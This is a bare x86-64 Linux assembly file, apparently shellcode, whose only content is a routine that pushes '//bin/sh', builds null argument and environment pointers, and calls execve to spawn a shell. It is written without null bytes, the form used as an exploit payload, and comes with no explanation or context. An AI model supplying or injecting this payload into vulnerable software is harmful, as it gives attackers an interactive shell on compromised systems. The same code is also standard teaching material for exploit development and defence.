global _start

section .text

_start: 
xor rax, rax
push rax

mov rbx, 0x68732f6e69622f2f
push rbx
mov rdi, rsp

push rax
mov rdx, rsp

push rax
mov rsi, rsp

xor rax, rax 
mov al, 0x3b
syscall
